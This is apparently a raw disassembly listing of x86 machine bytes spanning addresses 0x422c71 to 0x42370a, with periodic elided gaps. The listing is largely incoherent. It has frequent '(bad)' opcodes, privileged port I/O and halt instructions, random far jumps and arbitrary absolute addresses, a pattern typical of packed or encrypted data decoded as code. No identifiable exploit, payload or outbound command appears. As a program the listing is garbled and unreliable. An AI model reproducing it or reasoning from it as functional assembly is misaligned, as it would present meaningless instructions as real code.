  422c71:	hlt    
  422c72:	mov    eax,0xf828304
  422c77:	inc    esi
  422c78:	fiadd  DWORD PTR ds:0xabdd8017
  422c7e:	pop    edi
  422c7f:	dec    DWORD PTR [edx+0x9]
  422c82:	push   edx
  422c83:	(bad)  
  422c84:	inc    edx
  422c85:	push   0x5c
  422c87:	xchg   DWORD PTR [eax-0x36f37757],esi
  422c8d:	(bad)  
  422c8e:	nop
  422c8f:	push   eax
  422c90:	lods   eax,DWORD PTR ds:[esi]
  422c91:	ror    ebp,0xd3
  422c94:	or     eax,0x36b0ad58
  422c99:	jno    0x422c61
  422c9b:	test   eax,0x2fd534e3
  422ca0:	repnz push edx
  422ca2:	inc    edi
  422ca3:	mov    WORD PTR [ebp-0x7d5a998f],ds
  422ca9:	loope  0x422d07
  422cab:	sub    al,bh
  422cad:	(bad)  
  422caf:	xchg   ecx,eax
  422cb0:	js     0x422cdd
  422cb2:	jae    0x422d32
  422cb4:	xchg   DWORD PTR [eax-0x5c],ebp
  422cb7:	or     dl,dl
  422cb9:	sahf   
  422cba:	gs mov edx,0x5e08915a
  422cc0:	ins    DWORD PTR es:[edi],dx
  422cc1:	xchg   ebx,eax
  422cc2:	jb     0x422cc1
  422cc4:	mov    WORD PTR [edx+0x3c],cs
  422cc7:	hlt    
  422cc8:	int3   
  422cc9:	push   DWORD PTR [edx+ecx*8]
  422ccc:	fdivr  QWORD PTR [ebx-0x1b]
  422ccf:	dec    edx
  422cd0:	addr16 dec eax
  422cd2:	xor    DWORD PTR [esi],esp
  422cd4:	mov    ebx,0x9e02d580
  422cd9:	out    dx,eax
  422cda:	mov    eax,ds:0x545d287c
  422cdf:	mov    es,eax
  422ce1:	hlt    
  422ce2:	push   ebx
  422ce3:	aaa    
  422ce4:	mov    ebx,0xf96b116f
  422ce9:	jl     0x422d2f
  422ceb:	daa    
  422cec:	or     ebp,DWORD PTR [edx-0x34917c9b]
  422cf2:	sbb    eax,0x8308e6e5
  422cf7:	fld    st(2)
  422cf9:	aaa    
  422cfa:	jecxz  0x422d70
  422cfc:	mov    ecx,0x9c319e76
  422d01:	mov    es,WORD PTR [eax+0x3d]
  422d04:	jns    0x422cfa
  422d06:	adc    DWORD PTR [edx],0x8c78b37
  422d0c:	mov    ds:0x8ba9b1a3,eax
  422d11:	in     eax,dx
  422d12:	dec    ebx
  422d13:	xor    edx,DWORD PTR [ecx-0x56f2bcb7]
  422d19:	shr    DWORD PTR [edx+0x6cec70d3],1
  422d1f:	sub    al,0x29
  422d21:	mov    al,dh
  422d23:	mov    ds:0xb421f55c,eax
  422d28:	in     al,dx
  422d29:	jae    0x422d86
  422d2b:	mov    bl,0x3d
  422d2d:	xor    eax,0xded7811b
  422d32:	aas    
  422d33:	repnz xor al,0xdb
  422d36:	icebp  
  422d37:	pop    ebp
  422d38:	push   0x34
  422d3a:	and    BYTE PTR [ebx+0x22996d36],bh
  422d40:	iret   
  422d41:	cs test al,0xc0
  422d44:	test   cl,dl
  422d46:	ss inc ebp
  422d48:	call   0x13:0x8f0ebdf
  422d4f:	(bad)  
  422d50:	fld    DWORD PTR [eax]
  422d52:	lods   al,BYTE PTR ds:[esi]
  422d53:	dec    esi
  422d54:	leave  
  422d55:	nop
  422d56:	push   ebx
  422d57:	add    al,cl
  422d59:	jge    0x422d37
  422d5b:	cdq    
  422d5c:	mov    cl,0x5f
  422d5e:	fwait
  422d5f:	dec    edx
  422d60:	xor    bl,BYTE PTR [eax]
  422d62:	mov    edi,DWORD PTR [ebp-0x600e1a21]
  422d68:	lahf   
  422d69:	xor    DWORD PTR [ecx+0x75],0x44f4
	...
  422dd4:	add    BYTE PTR [eax],al
  422dd6:	mov    edi,0x626d60bd
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    edx,DWORD PTR [ebp-0x44]
  422de4:	jle    0x422e01
  422de6:	addr16 jbe 0x422dea
  422de9:	add    BYTE PTR [eax],al
  422deb:	add    DWORD PTR [eax],eax
  422ded:	add    ch,bh
  422def:	adc    ah,cl
  422df1:	in     al,dx
  422df2:	mov    ch,0x7b
  422df4:	xchg   esi,eax
  422df5:	jmp    0xcee4:0xead61963
  422dfc:	mov    ch,BYTE PTR [eax+ebp*8]
  422dff:	out    0x9c,al
  422e01:	sti    
  422e02:	int    0x24
  422e04:	clc    
  422e05:	mov    ebp,0xce426ecf
  422e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e0b:	add    al,BYTE PTR [ecx]
  422e0d:	imul   eax,esp,0xba308c1a
  422e13:	and    ah,BYTE PTR [edi+0x6d249b6d]
  422e19:	pop    edx
  422e1a:	cmp    BYTE PTR [ecx],dh
  422e1c:	cmp    cl,BYTE PTR [ecx+ecx*8-0x10]
  422e20:	mov    bh,0x41
  422e22:	jecxz  0x422e57
  422e24:	jnp    0x422e5c
  422e26:	sub    edi,ecx
  422e28:	mov    al,ds:0x662c5166
  422e2d:	or     ch,cl
  422e2f:	and    eax,0xb9cf34d
  422e34:	popf   
  422e35:	fs scas al,BYTE PTR es:[edi]
  422e37:	pop    ebp
  422e38:	(bad)  [esi+0x70e6f4dd]
  422e3e:	cwde   
  422e3f:	nop
  422e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e41:	aad    0x58
  422e43:	aam    0x8a
  422e45:	ret    0x5b02
  422e48:	jnp    0x422eac
  422e4a:	xchg   BYTE PTR [ecx],dl
  422e4c:	out    dx,al
  422e4d:	and    eax,0x632998bb
  422e52:	pushf  
  422e53:	xor    ah,BYTE PTR [edx+0xc]
  422e56:	fidivr DWORD PTR [edi+0x75]
  422e59:	cdq    
  422e5a:	inc    esp
  422e5b:	fmul   DWORD PTR [edi+0x467c0e36]
  422e61:	inc    esp
  422e62:	cdq    
  422e63:	sbb    eax,0x156a83aa
  422e68:	fucomp st(7)
  422e6a:	jmp    0x422e47
  422e6c:	cld    
  422e6d:	dec    ebx
  422e6e:	add    BYTE PTR [esi],cl
  422e70:	addr16 in eax,0x4f
  422e73:	loope  0x422e47
  422e75:	test   DWORD PTR [eax-0x5a],ebx
  422e78:	xor    dh,ch
  422e7a:	adc    esp,esi
  422e7c:	inc    edx
  422e7d:	inc    edi
  422e7e:	dec    edx
  422e7f:	das    
  422e80:	out    0x59,al
  422e82:	in     al,dx
  422e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e84:	sbb    cl,BYTE PTR [ecx]
  422e86:	jbe    0x422e4a
  422e88:	inc    eax
  422e89:	add    ah,BYTE PTR [ecx+ecx*1+0x55]
  422e8d:	add    al,0xd7
  422e8f:	popa   
  422e90:	mov    bh,0xde
  422e92:	cmp    eax,0x66b567bb
  422e97:	adc    BYTE PTR [ebp-0x5c4225c1],al
  422e9d:	sub    dh,BYTE PTR [edx-0x7a]
  422ea0:	push   ebp
  422ea1:	aam    0x1f
  422ea3:	int3   
  422ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ea5:	xchg   BYTE PTR [ecx+ebx*4+0x39],ch
  422ea9:	dec    esp
  422eaa:	bnd jmp 0x422e87
  422ead:	dec    ebx
  422eae:	fdivr  DWORD PTR [ebx+0x1fcc0ce5]
  422eb4:	rcl    DWORD PTR [edx+0x37],0xa4
  422eb8:	mov    ah,0x62
  422eba:	shr    BYTE PTR [ebp+ebp*8-0x34],cl
  422ebe:	hlt    
  422ebf:	mov    cl,0x82
  422ec1:	xchg   edx,eax
  422ec2:	or     BYTE PTR [edi-0x711397dc],bl
  422ec8:	adc    BYTE PTR [edi-0x5e],al
  422ecb:	test   DWORD PTR [ecx+edx*4+0x52e70f45],esi
  422ed2:	jnp    0x422e83
  422ed4:	cli    
  422ed5:	or     bh,dh
  422ed7:	rcr    BYTE PTR [ecx],0xc4
  422eda:	fcomip st,st(2)
  422edc:	std    
  422edd:	loopne 0x422e6e
  422edf:	push   ebx
  422ee0:	leave  
  422ee1:	imul   ebp,DWORD PTR [edi],0x49fd40f1
  422ee7:	xchg   edx,eax
  422ee8:	nop
  422ee9:	pop    esi
  422eea:	sub    eax,0x7adbfd
	...
  422f53:	add    BYTE PTR [eax],al
  422f55:	add    BYTE PTR [ebx-0x21e677ab],al
  422f5b:	fst    QWORD PTR [ebx+0x33b808df]
  422f61:	retf   0x551a
  422f64:	mov    cl,0x57
  422f66:	addr16 ja 0x422f6a
  422f69:	add    BYTE PTR [eax],al
  422f6b:	add    DWORD PTR [eax],eax
  422f6d:	add    BYTE PTR [eax],dh
  422f6f:	add    eax,0xbe72fa19
  422f74:	mov    al,0x66
  422f76:	(bad)  
  422f77:	jp     0x422f16
  422f79:	xchg   edx,eax
  422f7a:	fisub  WORD PTR [edx]
  422f7c:	cdq    
  422f7d:	arpl   WORD PTR [ebx+ebp*8+0x681463b7],sp
  422f84:	ffreep st(7)
  422f86:	fstp   TBYTE PTR [edi+0x32b526cb]
  422f8c:	mov    ds:0xaac91572,al
  422f91:	fst    QWORD PTR [ecx+0x20]
  422f94:	dec    esp
  422f95:	push   edi
  422f96:	sbb    cl,BYTE PTR [ebx-0x4]
  422f99:	add    al,0x3a
  422f9b:	lock sub dl,bh
  422f9e:	mov    edi,0xd40b03c5
  422fa3:	call   DWORD PTR [ebx]
  422fa5:	push   ss
  422fa6:	(bad)  
  422fa7:	retf   0x8944
  422faa:	or     al,0xd5
  422fac:	pop    ss
  422fad:	fcom   DWORD PTR [edi-0x20]
  422fb0:	jnp    0x42300e
  422fb2:	and    al,0xe0
  422fb4:	jmp    0x11377078
  422fb9:	sbb    al,0xa5
  422fbb:	int3   
  422fbc:	dec    esi
  422fbd:	jl     0x423023
  422fbf:	pushf  
  422fc0:	xchg   esp,eax
  422fc1:	pop    ebx
  422fc2:	es stos DWORD PTR es:[edi],eax
  422fc4:	cmp    ebp,DWORD PTR [ecx+ecx*1+0x17]
  422fc8:	jne    0x422fe5
  422fca:	retf   0xfa28
  422fcd:	ins    DWORD PTR es:[edi],dx
  422fce:	jno    0x422f70
  422fd0:	add    BYTE PTR gs:[ecx-0x45],cl
  422fd4:	dec    eax
  422fd5:	xlat   BYTE PTR ds:[ebx]
  422fd6:	xchg   esp,eax
  422fd7:	pop    edx
  422fd8:	hlt    
  422fd9:	retf   0x6e95
  422fdc:	xor    ch,al
  422fde:	jno    0x42300d
  422fe0:	lds    esi,FWORD PTR [ebx-0x40faf35c]
  422fe6:	ret    
  422fe7:	cli    
  422fe8:	or     edx,edx
  422fea:	adc    ebp,esp
  422fec:	cmp    esp,DWORD PTR [esi-0x35]
  422fef:	lock adc BYTE PTR fs:[ecx+esi*1-0x371e493a],0x9d
  422ff9:	aam    0x50
  422ffb:	(bad)  
  422ffc:	aam    0x6a
  422ffe:	out    0xca,eax
  423000:	jp     0x422fd8
  423002:	imul   edx,DWORD PTR [eax+0x78],0x1b5cdbcd
  423009:	adc    al,0x1
  42300b:	jecxz  0x422fe0
  42300d:	ror    BYTE PTR [edx+0x37],cl
  423010:	in     eax,0xf3
  423012:	les    ebx,FWORD PTR [ebx-0x2ee7fc17]
  423018:	push   ebx
  423019:	das    
  42301a:	push   0x52
  42301c:	out    dx,eax
  42301d:	(bad)  
  42301e:	je     0x42301b
  423020:	inc    esi
  423021:	xchg   BYTE PTR [esi+ebp*1+0x53],cl
  423025:	loopne 0x42308b
  423027:	adc    eax,DWORD PTR [esi+ebx*4+0x5ab78f]
  42302e:	data16 mov ds:0x452b3b9c,al
  423034:	retf   0x3d4c
  423037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423038:	rcr    DWORD PTR [ebx+0x5f],cl
  42303b:	pop    esp
  42303c:	push   eax
  42303d:	xchg   ebx,eax
  42303e:	fmul   st,st(1)
  423040:	mov    BYTE PTR [esi],ah
  423042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423043:	sub    DWORD PTR [eax-0x76885ab8],ecx
  423049:	gs pop edi
  42304b:	(bad)  
  42304d:	retf   
  42304e:	mov    ebp,DWORD PTR [esi+0x17c4d281]
  423054:	jecxz  0x42305a
  423056:	jp     0x4230cb
  423058:	or     ecx,DWORD PTR [eax-0x4e14b4ac]
  42305e:	gs push ecx
  423060:	aam    0x88
  423062:	mov    ds:0xa1657dfb,al
  423067:	out    dx,al
  423068:	(bad)  
  42306a:	das    
  42306b:	iret   
  42306c:	xlat   BYTE PTR ds:[ebx]
  42306d:	int3   
	...
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [edx+ebp*2+0x67d235ff],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    BYTE PTR [ebx+0x6a],dl
  4230f0:	push   esi
  4230f1:	sahf   
  4230f2:	xchg   ebp,eax
  4230f3:	add    dl,BYTE PTR [ecx]
  4230f5:	clc    
  4230f6:	mov    ebp,0xef3029e5
  4230fb:	sbb    eax,DWORD PTR [edi+0x7e]
  4230fe:	leave  
  4230ff:	mov    ds:0xbcb86829,al
  423104:	retf   0x3217
  423107:	mov    edi,0xcd51948c
  42310d:	ror    DWORD PTR [edi],cl
  42310f:	sub    BYTE PTR [ebp-0x50],dh
  423112:	daa    
  423113:	test   BYTE PTR [ebx],dl
  423115:	lds    edi,FWORD PTR [ebx+0x4d]
  423118:	sahf   
  423119:	adc    esi,DWORD PTR [ecx+0x6447e6a7]
  42311f:	and    BYTE PTR [ebp-0x4f],dh
  423122:	or     al,al
  423124:	jne    0x4230f6
  423126:	inc    esi
  423127:	xor    BYTE PTR ds:0x30911fea,bl
  42312d:	loope  0x42319d
  42312f:	test   eax,0x661035d9
  423134:	mov    edi,0x8edfd638
  423139:	sbb    esp,DWORD PTR [edx-0x6b]
  42313c:	jmp    DWORD PTR [ebx-0x42]
  42313f:	mov    ds:0x9f4f1d83,al
  423144:	cdq    
  423145:	jne    0x4230ea
  423147:	add    DWORD PTR [ecx+ebx*2-0x2ed3c8a5],0xb11e97d6
  423152:	hlt    
  423153:	mov    cl,0xac
  423155:	jecxz  0x423137
  423157:	mov    edx,0x61a8ad6e
  42315c:	sub    ebp,DWORD PTR [ecx]
  42315e:	cs push edx
  423160:	inc    ecx
  423161:	inc    eax
  423162:	dec    ebx
  423163:	push   esi
  423164:	mov    ds:0x5f6efd7d,al
  423169:	inc    esp
  42316a:	adc    BYTE PTR [edx-0x78],0xfb
  42316e:	xchg   esp,eax
  42316f:	outs   dx,DWORD PTR ds:[esi]
  423170:	add    ch,cl
  423172:	inc    ebp
  423173:	daa    
  423174:	out    0x1d,al
  423176:	jbe    0x423162
  423178:	mov    DWORD PTR [edx],ebp
  42317a:	cmp    esp,DWORD PTR [eiz*1-0xaddc4e9]
  423181:	loop   0x42312b
  423183:	mov    WORD PTR [edi],cs
  423185:	das    
  423186:	sbb    al,0x20
  423188:	add    DWORD PTR [ecx-0x461849e0],ebx
  42318e:	mov    eax,ds:0x135b5263
  423193:	(bad)  
  423194:	fistp  QWORD PTR [esi+esi*1+0x1a]
  423198:	xchg   ebx,eax
  423199:	mov    dh,0x1c
  42319b:	ins    BYTE PTR es:[edi],dx
  42319c:	jmp    0xcf063d1f
  4231a1:	clc    
  4231a2:	pop    edx
  4231a3:	dec    esp
  4231a4:	mov    edi,ebx
  4231a6:	dec    esi
  4231a7:	xchg   edi,eax
  4231a8:	(bad)  
  4231a9:	stc    
  4231aa:	cmp    esi,edi
  4231ac:	fdivr  QWORD PTR [edi-0x1]
  4231af:	mov    esp,0x261f24f4
  4231b4:	lock and eax,0xa350dc79
  4231ba:	and    BYTE PTR [ecx+eax*8-0x2fc27246],cl
  4231c1:	pop    es
  4231c2:	and    eax,0x624e36a5
  4231c7:	std    
  4231c8:	jae    0x42315b
  4231ca:	or     eax,0x91008730
  4231cf:	add    eax,0x53d2e809
  4231d4:	iret   
  4231d5:	loopne 0x423231
  4231d7:	lock loop 0x423221
  4231da:	mov    al,0x4e
  4231dc:	clc    
  4231dd:	inc    esi
  4231de:	(bad)  
  4231df:	cli    
  4231e0:	pop    ebx
  4231e1:	dec    esi
  4231e2:	xlat   BYTE PTR ds:[ebx]
  4231e3:	or     DWORD PTR [ebp+0x5ca59797],esi
  4231e9:	mul    DWORD PTR [ecx+0x47]
  4231ec:	mov    ecx,0xb3
	...
  423255:	add    BYTE PTR [ecx-0xf],bh
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx-0x6d0d2728],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    bl,bh
  42326f:	mov    eax,ds:0x5a4552e1
  423274:	or     BYTE PTR [edi+edx*1+0x0],bl
  423278:	and    BYTE PTR [edi+ebp*4-0x1e],0x77
  42327d:	cmp    al,0x71
  42327f:	shl    BYTE PTR [esi+0x6ad93c83],1
  423285:	mov    eax,0xc2828772
  42328a:	imul   DWORD PTR [ebp-0xc]
  42328d:	je     0x4232d1
  42328f:	shl    BYTE PTR [edx+eax*2+0x42],cl
  423293:	push   ebx
  423294:	lods   al,BYTE PTR ds:[esi]
  423295:	dec    esp
  423296:	or     BYTE PTR [eax-0x51f0867],bh
  42329c:	sar    BYTE PTR [esi+0x3d],cl
  42329f:	nop
  4232a0:	jle    0x4232d5
  4232a2:	outs   dx,DWORD PTR ds:[esi]
  4232a3:	push   0xffffffa6
  4232a5:	jle    0x423262
  4232a7:	ret    0x495b
  4232aa:	shl    DWORD PTR [ecx+0x21f915eb],cl
  4232b0:	les    edx,FWORD PTR [eax+0x7e]
  4232b3:	push   eax
  4232b4:	jns    0x423333
  4232b6:	push   ebp
  4232b7:	hlt    
  4232b8:	sbb    BYTE PTR [edi+ecx*2],dl
  4232bb:	jmp    0xbaeec0a2
  4232c0:	push   es
  4232c1:	jb     0x4232af
  4232c3:	mov    ah,0x21
  4232c5:	sbb    BYTE PTR [esi+0x749a5e9e],cl
  4232cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232cc:	(bad)  
  4232cd:	stos   BYTE PTR es:[edi],al
  4232ce:	aaa    
  4232cf:	add    bh,bh
  4232d1:	jmp    0x5ac4:0x3426220d
  4232d8:	scas   al,BYTE PTR es:[edi]
  4232d9:	jno    0x4232ff
  4232db:	dec    eax
  4232dc:	gs xchg edi,eax
  4232de:	popf   
  4232df:	ins    BYTE PTR es:[edi],dx
  4232e0:	cld    
  4232e1:	xchg   esi,eax
  4232e2:	cmc    
  4232e3:	push   edx
  4232e4:	mov    eax,0xa6ca6d0c
  4232e9:	(bad)  
  4232ea:	jbe    0x4232fc
  4232ec:	scas   al,BYTE PTR es:[edi]
  4232ed:	scas   eax,DWORD PTR es:[edi]
  4232ee:	or     cl,al
  4232f0:	cld    
  4232f1:	mov    al,0x66
  4232f3:	out    0xbf,eax
  4232f5:	sub    edi,edx
  4232f7:	and    ah,cl
  4232f9:	fcom   QWORD PTR [ebx-0x49ddf1be]
  4232ff:	xor    edx,ebp
  423301:	lahf   
  423302:	fcomp  DWORD PTR [ebp+0x5733d824]
  423308:	rcl    DWORD PTR [ecx],cl
  42330a:	dec    dl
  42330c:	xlat   BYTE PTR ds:[ebx]
  42330d:	mov    ch,0xd
  42330f:	or     al,0x85
  423311:	xchg   esi,eax
  423312:	fst    DWORD PTR [ebp-0x60]
  423315:	sub    al,0xb6
  423317:	aaa    
  423318:	inc    esi
  423319:	in     al,dx
  42331a:	fst    st(7)
  42331c:	sbb    DWORD PTR [ebp-0x12],0x2acaeb4b
  423323:	or     al,0xdb
  423325:	jge    0x4232d1
  423327:	xchg   edi,eax
  423328:	jnp    0x4232d6
  42332a:	xchg   ah,ah
  42332c:	or     esi,ecx
  42332e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42332f:	mov    ds:0x993af28,eax
  423334:	mov    esi,0x842ef92d
  423339:	jne    0x423384
  42333b:	nop
  42333c:	or     BYTE PTR [edx*1-0x2cbab1b],bh
  423343:	pusha  
  423344:	adc    eax,0xa63e454c
  423349:	add    BYTE PTR [ecx+0x8],bh
  42334c:	(bad)  
  42334d:	cmp    BYTE PTR [eax],al
  42334f:	sbb    ebp,DWORD PTR [esi+0x5]
  423352:	mov    eax,ds:0xc82a3bd6
  423357:	mov    ch,0x81
  423359:	cmc    
  42335a:	sbb    al,al
  42335c:	dec    esp
  42335d:	nop
  42335e:	fcom   DWORD PTR [ecx]
  423360:	paddb  mm0,QWORD PTR ds:0x800e63ca
  423367:	(bad)  
  423368:	fld    TBYTE PTR [edx]
  42336a:	jns    0x423306
  42336c:	and    al,0xfb
	...
  4233d6:	clc    
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0xa9c10f44
  4233e4:	and    bl,BYTE PTR [eax+0x67]
  4233e7:	jp     0x4233ea
  4233e9:	add    BYTE PTR [eax],al
  4233eb:	add    DWORD PTR [eax],eax
  4233ed:	add    BYTE PTR [edx+0x748461fe],cl
  4233f3:	xchg   esi,eax
  4233f4:	add    DWORD PTR [edi],esi
  4233f6:	mov    esi,0xc599c548
  4233fb:	sbb    dh,BYTE PTR [esi]
  4233fd:	fadd   st(2),st
  4233ff:	jae    0x42342b
  423401:	mov    bh,0x98
  423403:	sti    
  423404:	gs xchg si,ax
  423407:	int3   
  423408:	dec    edx
  423409:	sub    ebp,DWORD PTR [eax]
  42340b:	inc    edx
  42340c:	jmp    0x4e0b55fb
  423411:	into   
  423412:	pop    esp
  423413:	loope  0x423445
  423415:	daa    
  423416:	or     esp,esp
  423418:	sti    
  423419:	fsubr  DWORD PTR [ebp+0x38]
  42341c:	(bad)  
  42341d:	jne    0x4233e7
  42341f:	push   ds
  423420:	push   esi
  423421:	(bad)  
  423422:	pushf  
  423423:	jae    0x4233ae
  423425:	add    DWORD PTR [edi-0x62],ecx
  423428:	dec    DWORD PTR [eax]
  42342a:	xor    DWORD PTR [ebp+0x66],edi
  42342d:	push   ecx
  42342e:	mov    dl,0xa3
  423430:	jbe    0x4233cd
  423432:	mov    dh,0xa5
  423434:	adc    al,0x9
  423436:	or     BYTE PTR [edi-0x18cf0fa3],al
  42343c:	outs   dx,DWORD PTR ds:[esi]
  42343d:	call   0x267b:0xd96376bd
  423444:	(bad)  
  423445:	adc    eax,0x6e0324c7
  42344a:	push   esi
  42344b:	fimul  WORD PTR [ebx-0x2cc4033b]
  423451:	or     al,0x84
  423453:	mov    cl,0x39
  423455:	adc    BYTE PTR [esi],dh
  423457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423458:	or     eax,DWORD PTR [ecx+0x4a613d1e]
  42345e:	lods   eax,DWORD PTR ds:[esi]
  42345f:	push   0xb597b059
  423464:	fstp   DWORD PTR [edx-0x7a]
  423467:	test   al,0x16
  423469:	sbb    edx,edi
  42346b:	jl     0x4233f2
  42346d:	imul   BYTE PTR [edx+0x65]
  423470:	xlat   BYTE PTR ds:[ebx]
  423471:	xchg   ebp,eax
  423472:	std    
  423473:	cmc    
  423474:	pop    es
  423475:	aaa    
  423476:	jmp    0x4234c0
  423478:	pusha  
  423479:	test   DWORD PTR [esi],0x6220540
  42347f:	stc    
  423480:	mov    DWORD PTR [ebx+0x6f89d559],ebp
  423486:	vpperm ymm11,ymm0,ymm6,YMMWORD PTR [eax-0x68]
  42348d:	mov    ebp,0x98c3093f
  423492:	clc    
  423493:	mov    edx,eax
  423495:	or     al,0xfd
  423497:	(bad)  
  423498:	push   cs
  423499:	mov    ah,0xf1
  42349b:	rcl    DWORD PTR [edx+0x53b6c7e8],cl
  4234a1:	xor    BYTE PTR [ebx-0x6],dl
  4234a4:	inc    ebp
  4234a5:	jnp    0x423461
  4234a7:	bound  eax,QWORD PTR [edi+0xc]
  4234aa:	push   0xffffffab
  4234ac:	sub    ah,BYTE PTR [edx-0x71142b4c]
  4234b2:	(bad)  
  4234b3:	retf   0xd54f
  4234b6:	and    eax,0x1638d80d
  4234bb:	ror    ecx,0xa1
  4234be:	retf   0x45
  4234c1:	jmp    0xb736:0xb66fcff8
  4234c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234c9:	(bad)  
  4234ca:	out    dx,al
  4234cb:	mov    WORD PTR [ebx+0x28],cs
  4234ce:	inc    esp
  4234cf:	cmp    BYTE PTR [ebp+0xd48b5c0],cl
  4234d5:	cld    
  4234d6:	mov    ch,0xf7
  4234d8:	rol    bh,1
  4234da:	idiv   BYTE PTR [edi+0x38]
  4234dd:	rol    eax,1
  4234df:	test   eax,0xe725fd04
  4234e4:	cmp    BYTE PTR [edx+0x18],dh
  4234e7:	jnp    0x423496
  4234e9:	push   edi
  4234ea:	in     eax,0xf4
  4234ec:	cmp    esi,DWORD PTR [ecx+0x0]
	...
  423553:	add    BYTE PTR [eax],al
  423555:	add    al,al
  423557:	mov    al,0x45
  423559:	outs   dx,DWORD PTR ds:[esi]
  42355a:	jne    0x42355b
  42355c:	jmp    0xbd1f:0xadf467bf
  423563:	xor    BYTE PTR [ebp+0x17b6732],bh
  423569:	add    BYTE PTR [eax],al
  42356b:	add    DWORD PTR [eax],eax
  42356d:	add    BYTE PTR [edi-0x4ff314a9],cl
  423573:	shl    BYTE PTR [eax+eax*4-0x6c635e7a],1
  42357a:	fcom   DWORD PTR [edx]
  42357c:	sbb    BYTE PTR [ebx-0x4adcc5ef],0x79
  423583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423584:	mov    ebx,0xf43a4251
  423589:	cwde   
  42358a:	(bad)  
  42358b:	adc    DWORD PTR [ecx+0x7f6f2e42],ecx
  423591:	pop    esp
  423592:	cmp    al,0x99
  423594:	or     edi,edx
  423596:	in     al,dx
  423597:	xlat   BYTE PTR ds:[ebx]
  423598:	es stos DWORD PTR es:[edi],eax
  42359a:	fsubr  st(2),st
  42359c:	mov    ch,0x4c
  42359e:	mov    esi,0xc12ad57d
  4235a3:	add    bh,BYTE PTR [ebx]
  4235a5:	(bad)  
  4235a6:	or     BYTE PTR [esi-0x5f61b4e9],dl
  4235ac:	cmp    dh,BYTE PTR [ecx]
  4235ae:	test   DWORD PTR [edi-0x36d33043],0x348ec0c0
  4235b8:	push   ebx
  4235b9:	ror    BYTE PTR [esi],cl
  4235bb:	xchg   BYTE PTR [edi+0x73],bh
  4235be:	das    
  4235bf:	mov    ds:0x9ec59233,eax
  4235c4:	out    dx,eax
  4235c5:	and    eax,0xa7d8991e
  4235ca:	jbe    0x42360e
  4235cc:	add    al,0xbb
  4235ce:	rcl    DWORD PTR [ebx+0x4036e0c],1
  4235d4:	dec    edx
  4235d5:	call   0x65d6:0x77595db7
  4235dc:	bound  esi,QWORD PTR [eax]
  4235de:	(bad)  
  4235df:	mov    ebx,0x77f480e
  4235e4:	mov    eax,0x1bfaaf4e
  4235e9:	adc    BYTE PTR ds:[edx+0x2c],dl
  4235ed:	sti    
  4235ee:	mov    ecx,0x8a919dd9
  4235f3:	cmp    ebp,edx
  4235f5:	loope  0x4235b0
  4235f7:	mov    dl,0x28
  4235f9:	pusha  
  4235fa:	(bad)  
  4235fb:	or     al,0xeb
  4235fd:	jo     0x4235ff
  4235ff:	cdq    
  423600:	xchg   ebp,eax
  423601:	sub    cl,bl
  423603:	jns    0x423650
  423605:	mov    eax,ds:0x6dbc69ce
  42360a:	inc    esp
  42360b:	push   edx
  42360c:	and    eax,DWORD PTR [edx]
  42360e:	cmc    
  42360f:	lds    ebx,FWORD PTR [eax]
  423611:	jmp    0x614b:0x377682ad
  423618:	aad    0xfd
  42361a:	retf   
  42361b:	sbb    al,0xe
  42361d:	mov    bl,0xcb
  42361f:	jmp    0x4158885b
  423624:	lods   al,BYTE PTR ds:[esi]
  423625:	inc    ebp
  423626:	loopne 0x4235d2
  423628:	pop    esi
  423629:	or     ah,BYTE PTR [eax]
  42362b:	mov    edx,0xf8d6ea27
  423630:	mov    ecx,DWORD PTR [eax-0x10]
  423633:	mov    eax,ds:0x261ea3ec
  423639:	jge    0x42365f
  42363b:	xchg   esi,eax
  42363c:	push   es
  42363d:	mov    esi,ebx
  42363f:	lods   eax,DWORD PTR ds:[esi]
  423640:	adc    DWORD PTR [esi-0x69],ebx
  423643:	push   ecx
  423644:	push   edi
  423645:	lock mov ah,0xbd
  423648:	jae    0x42360b
  42364a:	test   al,0xd
  42364c:	hlt    
  42364d:	cmp    DWORD PTR [edi+0x48c00ea4],eax
  423653:	jmp    0x36ac3064
  423658:	and    al,BYTE PTR [ecx]
  42365a:	adc    edx,DWORD PTR [ecx+0x40e6878e]
  423660:	mov    ch,0xaf
  423662:	push   ebx
  423663:	or     DWORD PTR [edx+edi*4],0x26664bd4
  42366a:	dec    ecx
  42366b:	icebp  
  42366c:	jae    0x4236db
	...
  4236d6:	or     BYTE PTR [edi-0x8808b84],0x88
  4236dd:	jmp    FWORD PTR [esi-0x6f]
  4236e0:	jl     0x4236f5
  4236e2:	push   esi
  4236e3:	(bad)  
  4236e4:	mov    edx,DWORD PTR [edi+0x67]
  4236e7:	jl     0x4236ea
  4236e9:	add    BYTE PTR [eax],al
  4236eb:	add    DWORD PTR [eax],eax
  4236ed:	add    BYTE PTR [eax+ecx*1-0x18],cl
  4236f1:	ss sti 
  4236f3:	addr16 enter 0xb636,0x6
  4236f8:	hlt    
  4236f9:	cld    
  4236fa:	jmp    0x92e4ba90
  4236ff:	mov    bl,0xd2
  423701:	add    al,0x19
  423703:	xchg   esp,eax
  423704:	or     eax,0x54d035dd
  423709:	in     al,dx
  42370a:	fcom   DWORD PTR [eax]
